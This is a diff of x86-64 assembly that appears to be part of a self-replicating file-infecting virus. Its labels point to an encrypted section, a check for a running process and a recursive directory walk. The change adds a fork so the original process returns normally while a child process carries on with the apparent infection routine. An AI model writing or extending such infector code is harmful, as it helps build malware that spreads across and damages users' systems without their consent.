@@ -51,16 +51,22 @@ encrypted_start:
     cmp rax, 0
     jl exit
 
+    mov rax, SYS_GETPID
+    syscall
+    mov [rsp + ppid], rax
+
+birth_of_child:
+    mov rax, SYS_FORK
+    syscall
+    mov rax, SYS_GETPID
+    syscall
+    cmp rax, [rsp + ppid]
+    jz exit
+
+
     call get_processus_actif
     cmp rax, 0
     jnz exit
-
-birth_of_child:
-
- ;   mov rax, SYS_FORK
- ;   syscall
- ;   cmp rax, 0
- ;   jnz exit
 
     lea rdi, [rsp + fileName]
     lea rsi, [rel firstDir]
@@ -74,16 +80,16 @@ birth_of_child:
     call recursive
 
 exit:
+    mov rax, SYS_GETPID
+    syscall
+    cmp rax, [rsp + ppid]
+    jnz death_of_child
     pop rsi
     pop rdi
     pop rcx
     pop rdx
+    xor rax, rax
     leave
-
-  ;  xor rax, rax
-  ;  cmp r12, 0
-  ;  jz death_of_child
-
 jump:
     ret
     nop
@@ -92,6 +98,12 @@ jump:
     nop
 
 death_of_child:
+    pop rsi
+    pop rdi
+    pop rcx
+    pop rdx
+    xor rax, rax
+    leave
     ret
 
 %include "get_processus_actif.s"
